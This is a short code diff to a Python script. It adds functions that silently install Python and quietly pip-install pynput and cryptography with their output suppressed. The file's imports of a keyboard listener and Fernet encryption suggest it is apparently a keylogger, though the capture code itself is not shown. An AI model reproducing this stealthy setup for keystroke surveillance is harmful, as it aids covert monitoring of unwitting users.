@@ -1,5 +1,30 @@
 import subprocess
+import sys
 import os
+
+def install_python():
+    # Check if Python is installed already
+    if not os.path.exists("C:\\Python311\\python.exe"):
+        python_installer = "python-3.11.9-amd64.exe"
+        # Run Python installer silently
+        subprocess.run([python_installer, '/quiet', '/norestart'])
+
+def install_package(package):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
+def ensure_libraries_installed():
+    try:
+        import pynput
+    except ImportError:
+        install_package('pynput')
+    
+    try:
+        import cryptography
+    except ImportError:
+        install_package('cryptography')
+
+
 from pynput import keyboard
 from cryptography.fernet import Fernet
 
